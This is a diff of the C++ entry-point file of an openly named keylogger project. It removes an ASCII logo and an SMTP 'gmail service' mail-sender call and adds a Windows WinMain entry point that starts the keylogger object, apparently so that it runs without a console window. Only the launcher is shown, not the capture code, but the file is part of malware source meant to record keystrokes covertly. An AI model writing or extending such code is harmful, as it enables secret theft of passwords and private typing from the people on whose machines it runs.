@@ -1,8 +1,7 @@
-#include "aLibrary.h"
 #include "Keylogger.h"
-#include "Smtp_init.h"
+#include "aLibrary.h"
 
-int Logo() {
+/*int Logo() {
 	const string logo0 = "      ___        _              _   _     _        __      ";
 	const string logo1 = "     / / |      | |       /\\   | \\ | |   | |       \\ \\    ";
 	const string logo2 = "    / /| | _____| | __   /  \\  |  \\| | __| | ___  __\\ \\    ";
@@ -24,15 +23,18 @@ int Logo() {
 	cout << logo8 << endl;
 
 	return 0;
-}
-int main(){
-	Smtp smtpTMP;
-	Smtp *SMTP = &smtpTMP;
+}*/
 
-	Logo();
-	cout << "gmail service"<<endl;
-	SMTP->MainMailSender();
+int WINAPI WinMain(
+	HINSTANCE hIntance,
+	HINSTANCE hInt,
+	LPSTR CMD,
+	int CmdShow
+){
+	Key key;
+	Key *keylogger = &key;
+	
+	keylogger->but();
 
-	system("pause");
 	return 0;
 }
